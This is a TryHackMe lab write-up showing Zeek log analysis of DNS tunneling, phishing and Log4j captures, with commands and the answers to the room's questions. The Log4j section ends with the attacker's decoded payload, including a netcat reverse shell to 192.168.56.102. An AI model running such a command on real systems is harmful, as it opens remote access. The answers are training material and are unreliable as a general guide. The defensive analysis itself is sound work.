---
title: Zeekxercises
date: 2024-06-10 00:00:00 -500
categories: [TryHackMe, Network Security]
tags: [TryHackMe]
---


# Anomalous DNS

An alert triggered: "***Anomalous DNS Activity***".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

<u>Initializing Zeek</u>:

```c
zeek -v
sudo su
```

###### Question and Answers section:

- Investigate the **`dns-tunneling.pcap`** file. Investigate the **`dns.log`** file. What is the number of DNS records linked to the `IPv6 address`?
**Note: A record relates to IPv4 while AAAA record relates to IPv6!**

```c
$ zeek -C -r dns-tunneling.pcap
```

![](/assets/img/Pasted image 20240306150126.png)

<u>Log files generated</u>:
```c
- conn.log
- dns.log
- http.log
- ntp.log
- packet_filter.log
```

<u>Extracting important parts from dns.log</u>:
```c
$ cat dns.log | zeek-cut ts uid proto id.orig_h id.orig_p id.resp_h id.resp_p query qtype_name | sort -r | grep AAAA | wc -l
```

Output:

![](/assets/img/Pasted image 20240306151642.png)

Answer: `320`

![](/assets/img/Pasted image 20240306151654.png)


- Investigate the **`conn.log`** file. What is the longest connection duration?

<u>Command</u>:

```c
$ cat conn.log | zeek-cut duration | sort -r
```

Output:

![](/assets/img/Pasted image 20240306152051.png)

	- 9.420791


- Investigate the **`dns.log`** file. Filter all unique DNS queries. What is the number of unique domain queries?

<u>Command</u>:

```c
$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort -r | uniq
```

	- The first 'rev' flips the domain relative to the y-axis
	- The cut command splits the string when it sees the '.' delimiter and only keeping the first two fields separated by those two delimiter
	- The second 'rev' command flips the domain relative to the y-axis again returning it back to its original 'word' state
	- The 'sort' command sorts the dns queries in the list in a reverse alphabetical format
	- The 'uniq' command removes all duplicates


Output:

![](/assets/img/Pasted image 20240306153213.png)

	 - Answer is 6!


- There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the **`conn.log`** file. What is the IP address of the source host?

<u>Command</u>:

```c
$ cat conn.log | zeek-cut ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service | sort -r | uniq
```

Output:

![](/assets/img/Pasted image 20240306153731.png)

	- Answer: 10.20.57.3


-----------
# Phishing

An alert triggered: "***Phishing Attempt***".

The case was assigned to you. Inspect the `PCAP` and retrieve the artefacts to confirm this alert is a true positive.

- Investigate the logs. What is the suspicious source address? Enter your answer in **defanged format**.
```c
$ zeek -C -r phishing.pcap hash-demo.zeek
```

- Investigate the **`http.log`** file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.

From `http.log`, `knr.exe` was downloaded from `smart-fax.com`

![](/assets/img/Pasted image 20240306154929.png)

	- This is suspicious because .exe files aren't normally sent via email.


- Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?

```c
$ zeek -C -r phishing.pcap hash-demo.zeek
```

```c
$ cat files.log | zeek-cut md5 sha1 sha256
```

Output:

![](/assets/img/Pasted image 20240306160709.png)

![](/assets/img/Pasted image 20240306161607.png)


- Investigate the extracted malicious **`.exe`** file. What is the given file name in Virustotal?

```c
$ zeek -C -r phishing.pcap file-extract-demo.zeek
```

<u>Extracted file types</u>:

![](/assets/img/Pasted image 20240306155053.png)

<u>Extracted hashes</u>:

![](/assets/img/Pasted image 20240306160709.png)


- The `.exe` file is a malware:

![](/assets/img/Pasted image 20240306160748.png)


- Investigate the malicious **`.exe`** file in VirusTotal. What is the contacted domain name? Enter your answer in **defanged format**.

![](/assets/img/Pasted image 20240306161751.png)

	- Answer: hopto[.]org

- Investigate the `http.log` file. What is the request name of the downloaded malicious **`.exe`** file? `knr.exe`


<u>VT Links for all the three files extracted</u>:

```c
- '.exe' : [VirusTotal - File - 749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18](https://www.virustotal.com/gui/file/749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18/relations)
- '.doc' : [VirusTotal - File - f808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb](https://www.virustotal.com/gui/file/f808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb/details)
- '.txt' : [VirusTotal - File - 6137f8db2192e638e13610f75e73b9247c05f4706f0afd1fdb132d86de6b4012](https://www.virustotal.com/gui/file/6137f8db2192e638e13610f75e73b9247c05f4706f0afd1fdb132d86de6b4012/details)
```

---------

# Log4j

**An alert triggered:** "`Log4J Exploitation Attempt`".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

- Investigate the `log4shell.pcapng` file with `detection-log4j.zeek` script. Investigate the `signature.log` file. What is the number of signature hits?

<u>Command</u>:

```c
$ zeek -C -r log4shell.pcapng detection-log4j.zeek
```

Logs generated:

![](/assets/img/Pasted image 20240306162208.png)

Signature hits:

![](/assets/img/Pasted image 20240306162403.png)


- Investigate the **`http.log`** file. Which tool is used for scanning? `nmap`

![](/assets/img/Pasted image 20240306162517.png)


- Investigate the **`http.log`** file. What is the extension of the exploit file?

![](/assets/img/Pasted image 20240306162728.png)

	- `.class`


- Investigate the `log4j.log` file. Decode the ***base64*** commands. What is the name of the created file?
Commands:

![](/assets/img/Pasted image 20240306162823.png)

<u>Decoded</u>:
```c
touch /tmp/pwned

which nc > /tmp/pwned

nc 192.168.56.102 80 -e /bin/sh -vvv
```

